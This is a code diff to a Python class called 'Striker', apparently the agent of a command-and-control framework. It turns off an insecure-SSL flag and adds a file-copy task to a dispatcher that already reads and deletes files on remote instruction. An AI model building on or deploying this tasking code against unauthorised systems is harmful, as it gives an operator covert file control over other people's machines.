@@ -10,7 +10,7 @@ import urllib3
 import socket
 import warnings
 
-INSECURE_SSL = True
+INSECURE_SSL = False
 if (INSECURE_SSL): warnings.filterwarnings("ignore")
 
 class Striker:
@@ -189,6 +189,19 @@ class Striker:
       pass
     return count
 
+  def copy_file(self, src, dst):
+    if (os.path.isdir(dst)): dst = os.path.join(dst, os.path.basename(src))
+    rfo = open(src, "rb")
+    wfo = open(dst, "wb")
+    while True:
+      chunk = rfo.read(999999)
+      if not chunk: break
+      wfo.write(chunk)
+    n = wfo.tell()
+    rfo.close()
+    wfo.close()
+    return n
+
   def execTask(self, task):
     taskID = task['uid']
     data = {}
@@ -330,6 +343,12 @@ class Striker:
         result = "Error reading file: " + str(e)
     elif (task["taskType"] == "del"):
       result = str(self.delete_file(data["file"]))
+    elif (task["taskType"] == "cp"):
+      try:
+        result = str(self.copy_file(data["src"], data["dst"]))
+        successful = 1
+      except Exception as e:
+        result = "Error copying file: " + str(e)
     else:
       result = "Not implemented!"
     task["result"] = {"uid":taskID, "result":result, "successful": successful}
